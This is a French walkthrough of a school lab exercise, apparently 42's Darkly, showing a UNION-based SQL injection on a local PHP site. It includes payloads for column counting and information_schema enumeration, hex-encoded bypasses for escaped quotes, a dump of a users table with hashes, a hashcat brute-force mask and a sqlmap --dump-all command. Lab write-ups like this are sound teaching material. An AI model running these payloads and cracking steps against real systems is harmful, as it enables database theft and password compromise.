
## test basique pour check la vulnérabilité aux injections
```sql
1 OR 1=1
```
renvoie toutes les images dans la db utilisée par cette requête ```http://localhost:8080/index.php?page=searchimg&id=<PAYLOAD>```

## check le nombre de colonnes par tâtonnement
```sql
1 ORDER BY 1
```
renvoie la première image de la db -> donc la db a au moins une colonne 

```sql
1 ORDER BY 2
```
renvoie la première image de la db -> donc la db a au moins 2 colonnes

```sql
1 ORDER BY 3
```
ne renvoie rien -> a sûrement throw une erreur dans le back -> il n'y a pas de troisième colonne dans la db

maintenant on sait donc que toutes nos prochaines requêtes doivent renvoyer 2 colonnes, sinon elles ne pourront pas fonctionner

## get les infos de la db (eg. version, ...)
```sql
1 UNION SELECT version(), user()
```
renvoie la première image grâce à '1' -> puis exécute l'instruction suivante, 'UNION' étant comme un `&&` en bash -> return borntosec@localhost pour user() et 5.5.64-MariaDB-1ubuntu0.14.04.1 pour version()

## get tous les noms de toutes les db
```sql
1 UNION SELECT schema_name, 1 FROM information_schema.schemata
```
renvoie les noms de toutes les db du back, maintenant on sait quoi cibler -> Member_Sql_Injection PAR EXEMPLE

## lister toutes les tables de la db qui nous intéresse
```sql
1 UNION SELECT table_name, 1 FROM information_schema.tables WHERE table_schema='Member_Sql_Injection'
```
cela ne renvoie rien, pourquoi ? parce que les quotes sont sûrement échappées en '\' dans le back. on bypass cela en convertissant `Member_Sql_Injection` en hexa ou en char(x, x, ...)

en hexa, 'Member_Sql_Injection' = 0x4d656d6265725f53716c5f496e6a656374696f6e

en char(), 'Member_Sql_Injection' = char(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)

```sql
1 UNION SELECT table_name, 1 FROM information_schema.tables WHERE table_schema=0x4d656d6265725f53716c5f496e6a656374696f6e
```
cela renvoie donc toutes les tables, qui sont : `users` et c'est tout...

## lister tous les champs de la table users
```sql
1 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name=0x7573657273
```
même chose qu'au-dessus, mais cette fois avec la table `users (0x7573657273)` et on liste toutes les colonnes

| user_id | town | planet | country | last_name | first_name | Commentaire| countersign |
| :-----: | :---: | :---: | :-----: | :-------: | :--------: | :--------: | :---------: |
| ...     | ...   | ...   | ...     | ...       | ...        | ...        | ...         |

## lister toutes les valeurs de toutes les colonnes
```sql
1 UNION SELECT user_id, town FROM Member_Sql_Injection.users
```
on sait qu'il n'y a que 2 colonnes affichables, on peut donc récupérer les colonnes deux par deux (par exemple `user_id` et `town`).

| user_id | town | planet | country | last_name | first_name | Commentaire| countersign |
| :-----: | :---: | :---: | :-----: | :-------: | :--------: | :--------- | :---------: |
| 1 | Paris | EARTH | France | me | one | Je pense, donc je suis | 2b3366bcfd44f540e630d4dc2b9b06d9 |
| 2 | Helsinki | Earth | Finlande | me | two | Aamu on iltaa viisaampi. | 60e9032c586fb422e2c16dee6286cf10 |
| 3 | Dublin | Earth | Irlande | me | three | Dublin is a city of stories and secrets. | e083b24a01c483437bcf4a9eea7c1b4d |
| 5 | 42 | 42 | 42 | GetThe | Flag | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28 |

## crack le mot de passe
d'abord on clone et compile hashcat
```bash
git clone https://github.com/hashcat/hashcat.git hashcat && cd hashcat && make
```
après, on décrypte le mot de passe par brute force avec les indices qu'on a. on sait qu'il y a des majuscules, sûrement des minuscules et pas de chiffres. c'est des suppositions grâce au commentaire dans la db.
il n'y a sûrement pas plus de 8 caractères non plus. cela reste un exercice de 42, ils ne veulent pas que l'on passe 6 ans à crack un mot de passe.
sûrement pas de signes spéciaux pour la même raison.
```bash
./hashcat -m 0 -a 3 ../hash.txt -1 '?l?u' '?1?1?1?1?1?1?1?1' --increment -O
```
`-m 0` c'est le hash-type, ici md5 -> 0. on le sait grâce à la taille des mots de passe hachés retrouvés dans la db -> toujours 32 caractères en hexa, donc compris entre 0-9 et a-f

`-a 3` c'est le mode d'attaque, ici brute force 

`path/vers/hash.txt` le fichier .txt qui contient les hash a crack

`-1 '?l?u'` pour créer un 'type' de char custom, ici charset 1, avec `?l` pour les minuscules et `?u` pour les majuscules

`'?1?1?1?1?1?1?1?1'` c'est le mask à tester, 8 caractères de notre charset 1 (maj ou min)

`--increment` on a créé un mask de 8 caractères mais on ne sait pas quelle taille fait le mot de passe, on utilise donc cet argument pour tester toutes les tailles de mots de passe entre 1 et la taille du mask

`-O` optimized kernels -> ca va vite

## dump
avec tout ca, on peut extraire facilement toutes les valeurs de toutes les colonnes de toutes les tables. pour économiser du temps, j'ai tout dump avec sqlmap. le sujet dit : "You cannot use scripts such as sqlmap to make exploitation look trivial". etant donné que j'ai expliqué comment faire sans et que c'est uniquement pour éviter de faire 300 requêtes à la main, voila voila.
```bash
gcl https://github.com/sqlmapproject/sqlmap.git sqlmap
```
```bash
python3 sqlmap/sqlmap.py -u "http://localhost:8080/index.php?page=searchimg&id=1&Submit=Submit" -p id --dbms=MySQL --technique=U --dump-all
```
on obtient donc le fichier `log.txt` qui contient toutes les tables bien présentées.

# annexe
### ORDER BY
La commande ORDER BY permet de trier les lignes dans un résultat d’une requête SQL. Il est possible de trier les données sur une ou plusieurs colonnes, par ordre ascendant ou descendant.

### UNION
La commande UNION de SQL permet de mettre bout-à-bout les résultats de plusieurs requêtes utilisant elles-même la commande SELECT. C’est donc une commande qui permet de concaténer les résultats de 2 requêtes ou plus.

### version()
Dans le langage SQL, la fonction VERSION() permet de retourner la version du Système de Gestion de Base de Données (SGBD). Cette fonction permet de savoir exactement la version du système utilisé.

### user()
The USER() function returns the current user name and host name for the MySQL connection.

### SELECT
L’utilisation la plus courante de SQL consiste à lire des données issues de la base de données. Cela s’effectue grâce à la commande SELECT, qui retourne des enregistrements dans un tableau de résultat. Cette commande peut sélectionner une ou plusieurs colonnes d’une table.

### information_schema
information_schema est eune base de données système cachée dans MySQL/MariaDB qui contient toutes les métadonnées du serveur

### schemata
schemata est la table spécifique de la base système information_schema qui liste les bases de données existantes.

### sources
1. https://sql.sh/cours/order-by
2. https://sql.sh/cours/union
3. https://sql.sh/fonctions/version
4. https://www.w3schools.com/sql/func_mysql_user.asp
5. https://sql.sh/cours/select
6. https://docs.databricks.com/aws/en/sql/language-manual/sql-ref-information-schema
7. https://weakpass.com/